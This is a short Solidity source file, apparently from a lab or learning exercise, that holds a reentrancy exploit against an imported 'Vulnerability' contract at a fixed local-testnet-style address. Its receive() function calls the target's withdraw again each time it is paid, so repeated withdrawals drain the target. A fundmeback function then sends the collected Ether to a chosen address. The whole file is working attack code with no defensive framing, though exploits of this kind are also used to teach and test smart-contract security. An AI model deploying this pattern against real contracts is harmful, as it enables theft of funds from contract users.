// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Vulnerability.sol";

contract VulnerabilityExploit{

    Vulnerability vulnerabilityContract = Vulnerability(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3));

    constructor () public payable {}

    function deposit(address _to) external payable {
        vulnerabilityContract.deposit{value: 0.001 ether}(_to);
    }

    function withdraw() external {
        vulnerabilityContract.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        vulnerabilityContract.withdraw(msg.value);
    }
}